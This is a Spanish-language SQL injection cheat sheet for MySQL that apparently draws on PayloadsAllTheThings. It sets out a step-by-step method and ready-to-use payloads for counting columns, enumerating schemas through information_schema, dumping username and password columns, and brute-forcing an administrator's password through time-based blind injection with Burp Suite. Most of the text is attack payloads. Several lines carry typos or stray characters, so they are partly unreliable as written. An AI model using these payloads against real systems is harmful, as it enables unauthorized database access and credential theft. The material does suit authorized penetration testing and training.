# Inyeccion MySQL 

# Indice
 [MYSQL Default Databases](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases)
- [MYSQL Comments](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-comments)
- [MYSQL Union Based](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-union-based)
    - [Detect columns number](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#detect-columns-number)
    - [Extract database with information_schema](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-database-with-information_schema)
    - [Extract columns name without information_schema](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-columns-name-without-information_schema)
    - [Extract data without columns name](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-data-without-columns-name)
- [MYSQL Error Based](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based)
    - [MYSQL Error Based - Basic](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based---basic)
    - [MYSQL Error Based - UpdateXML function](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based---updatexml-function)
    - [MYSQL Error Based - Extractvalue function](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based---extractvalue-function)
- [MYSQL Blind](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-blind)
    - [MYSQL Blind with substring equivalent](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-blind-with-substring-equivalent)
    - [MYSQL Blind using a conditional statement](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-blind-using-a-conditional-statement)
    - [MYSQL Blind with MAKE_SET](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-blind-with-make_set)
    - [MYSQL Blind with LIKE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-blind-with-like)
- [MYSQL Time Based](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-time-based)
    - [Using SLEEP in a subselect](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#using-sleep-in-a-subselect)
    - [Using conditional statements](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#using-conditional-statements)
- [MYSQL DIOS - Dump in One Shot](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-dios---dump-in-one-shot)
- [MYSQL Current queries](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-current-queries)
- [MYSQL Read content of a file](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-read-content-of-a-file)
- [MYSQL Write a shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-write-a-shell)
    - [Into outfile method](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#into-outfile-method)
    - [Into dumpfile method](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#into-dumpfile-method)
- [MYSQL UDF command execution](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-udf-command-execution)
- [MYSQL Truncation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-truncation)
- [MYSQL Fast Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-fast-exploitation)
- [MYSQL Out of band](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-out-of-band)
    - [DNS exfiltration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#dns-exfiltration)
    - [UNC Path - NTLM hash stealing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#unc-path---ntlm-hash-stealing)
- [MYSQL WAF Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-waf-bypass)
    - [Alternative to information schema](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#alternative-to-information-schema)
    - [Alternative to version](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#alternative-to-version)
    - [Scientific Notation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#scientific-notation)
    - [Conditional Comments](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#conditional-comments)
    - [Wide byte injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#wide-byte-injection)
- [References](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#references)



# Bases de datos por defecto

|Name|Description|
|---|---|
|mysql|Requiere permisos root|
|information_schema|Disponible desde la version 5 y superiores|

# Metodologia
Normalmente al encontrar una vulnerabilidad de inyeccion SQL siempre vamos a seguir el mismo orden
1. Enumeracion de columnas
2. Enumeracion de columnas que imprimen contenido
3. Enumeracion de version, nombre de usuario, nombre de la base de datos, etc
4. Enumeracion de bases de datos
5. Enumeracion de tablas
6. Enumeracion de columnas
7. Dumpeo de datos
   

# Union based
## Deteccion del numero de columnas

Podemos usar `order by` o `group by`

````
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
````

````
1' GROUP BY 1--
1' GROUP BY 2--
1' GROUP BY 3--
````

> El numero correcto lo sabremos al obtener una respuesta que confirme que la query es falsa, es decir que el numero de columnas no existe:
- Error de SQL
- Cambio en el contenido de la respuesta (pueden aparecer o desaparecer cosas)
- Cambio en el Content-Length

ERROR BASED
> Estos metodos funcionan si el mostrar errores esta habilitado

`UNION SELECT`

````
1' UNION SELECT @--+        #The used SELECT statements have a different number of columns
1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns
1' UNION SELECT @,@,@--+    #Repetir este proceso hasta que no obtengamos errores 1 @ = 1 columna
````

`LIMIT INTO`

````
1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@,@--+    #Repetir este proceso hasta que no obtengamos errores 1 @ = 1 columna
````

`SELECT * FROM TABLA`
> Para este metodo necesitamos saber el nombre de la tabla

````
1' AND (SELECT * FROM Users) = 1--+ 	#Operand should contain 3 column(s)
````

## Enumeracion de la base de datos con information_schema

````
UniOn Select 1,2,schema_name+fRoM+information_schema.schemata
UniOn Select 1,2,table_name+fRoM+information_schema.tables+wHeRe+table_schema=<nombre_bd>
UniOn Select 1,2,column_name+fRoM+information_schema.columns+wHeRe+table_name=<tabla>
UniOn Select 1,data,user,password+fRoM+<tabla>
````

En caso que solo tengamos una columna para imprimir contenido podemos usar 'group_concat' para pedir en la misma consulta varios campos
````
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C,user,0x7C,password)+fRoM+<tabla>
````

# Error based

````
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
````

# Blind
Para explotar este tipo de inyeccion SQL usaremos la funcion `sleep` como confirmacion al pedir los datos de manera que si la request tarda en realizarse x segundos confirmaremos la vulnerabilidad.


Seguiremos empleando condicionales

````
select+case+when+(<CONDITION>)+THEN+<ACTION DE CONFIRMACION V>+ELSE+<ACTION DE CONFIRMACION F>+END from <table>--
````

Una vez encontrado el campo inyectable confirmaremos el time based con la siguiente consulta simple

````
‘|| sleep(10)--
````

A continuación para conseguir información de la base de datos emplearemos condicionales usando la query de ejemplo, primero confirmaremos que la condición funciona con 1=1 
````
select+case+when+(1=1)+THEN+sleep(10)+ELSE+sleep(0)>+END--
````

Viendo que la request tarda 10 segundos confirmamos que funciona ahora vamos a enumerar la base de datos sabiendo que en la tabla users hay un usuario llamado administrator
````
select+case+when+(userame=’administrator’)+THEN+sleep(10)+ELSE+sleep(0)>+END from users--

# Hayamos la longitud de la contraseña
select+case+when+(userame=’administrator’ AND LENGTH(password)><1,2,3,...>)+THEN+sleep(10)+ELSE+sleep(0)>+END from users--

# Hayar todos los caracteres de la contraseña (longitud = 20)
select+case+when+(userame=’administrator’ AND SUBSTRING(password,1,1)='a')+THEN+sleep(10)+ELSE+sleep(0)>+END from users–
````

> No olvidar indicar el usuario del que queremos la contraseña ya que si no cojera la de cualquier campo.

A partir de aqui la manera mas eficiente de dumpear todos los caracteres es mediante fuerza bruta, lo haremos con la ClusterBomb de BurpSuite 
````
select+case+when+(userame=’administrator’ AND SUBSTRING(password,§1§,1)='§a§')+THEN+sleep(10)+ELSE+sleep(0)>+END from users–
````

> Importante indicar que envie una solo request por intento

![image](https://github.com/n3masyst/Pentesting/assets/133997401/bbb2d244-2233-412f-b7f0-10c894fcfe85)

